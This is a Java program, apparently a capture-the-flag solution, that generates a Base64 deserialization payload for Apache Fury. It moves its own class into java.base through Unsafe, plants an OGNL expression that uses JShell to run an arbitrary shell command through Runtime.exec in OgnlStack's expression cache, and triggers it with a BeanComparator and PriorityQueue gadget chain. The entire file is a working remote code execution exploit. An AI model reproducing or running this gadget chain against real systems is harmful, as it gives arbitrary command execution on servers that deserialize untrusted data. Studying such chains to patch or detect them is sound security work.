import com.feilong.lib.beanutils.BeanComparator;
import com.feilong.lib.excel.ognl.OgnlStack;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.PriorityQueue;

public class GenPayload {
    public static void main(String[] args) throws Exception {
        String command = args.length == 0 ? "touch /tmp/ezff_pwned" : args[0];

        openJavaBaseModule();

        OgnlStack ognlStack = new OgnlStack(null);
        String expression = "@jdk.jshell.JShell@create().eval('Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\""
                + escapeForJavaString(command)
                + "\"});')";

        Method getExpression = ognlStack.getClass().getDeclaredMethod("getExpression", String.class);
        getExpression.setAccessible(true);
        Object parsedExpression = getExpression.invoke(ognlStack, expression);

        Field expressionsMapField = ognlStack.getClass().getDeclaredField("expressionsMap");
        expressionsMapField.setAccessible(true);
        HashMap<String, Object> cacheMap = new HashMap<>();
        cacheMap.put("yyy", parsedExpression);
        expressionsMapField.set(ognlStack, cacheMap);

        BeanComparator<Object> comparator = new BeanComparator<>();
        setFieldValue(comparator, "property", "value(yyy)");

        PriorityQueue<Object> queue = new PriorityQueue<>();
        setFieldValue(queue, "comparator", comparator);
        setFieldValue(queue, "queue", new Object[]{ognlStack, ognlStack});
        setFieldValue(queue, "size", 2);

        Fury fury = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .build();

        byte[] payload = fury.serialize(queue);
        String data = Base64.getEncoder().encodeToString(payload);

        System.out.println(data);
        System.err.println("data length = " + data.length());
    }

    private static String escapeForJavaString(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static Field getField(Class<?> clazz, String fieldName) throws Exception {
        try {
            return clazz.getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            Class<?> superClass = clazz.getSuperclass();
            if (superClass != null && superClass != Object.class) {
                return getField(superClass, fieldName);
            }
            throw e;
        }
    }

    private static void openJavaBaseModule() throws Exception {
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field field = unsafeClass.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        Module baseModule = Object.class.getModule();
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.getAndSetObject(GenPayload.class, addr, baseModule);
    }
}
